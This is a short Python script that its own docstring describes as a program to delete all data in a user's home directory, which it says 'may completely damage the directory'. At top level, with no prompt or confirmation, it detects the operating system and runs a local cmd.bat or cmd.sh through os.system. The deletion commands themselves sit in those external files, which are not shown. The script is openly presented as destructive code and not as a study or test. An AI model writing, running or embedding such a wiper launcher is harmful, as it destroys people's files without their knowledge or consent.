import os
import platform
"""
A progrm that deletes all the data present in C:Users/<user>
directory, which may completely damage the directory
It has a dependency of a batch file
A Batch file is a cmd file that execute commands like 
shell file i.e., .sh file
params: None
return:None
"""
def clear_windows():
    """
    params: None
    return: None
    A function to clear all the data in a Windows Environment
    """
    os.system(f"cmd.bat")

def clear_Linux():
    """
    params: None
    return: None
    A function to clear all the data in a Linux Environment
    """
    os.system(f"cmd.sh")
if platform.system() == "Windows":
    clear_windows()
elif platform.system() == "Linux":
    clear_Linux()
else:raise OSError
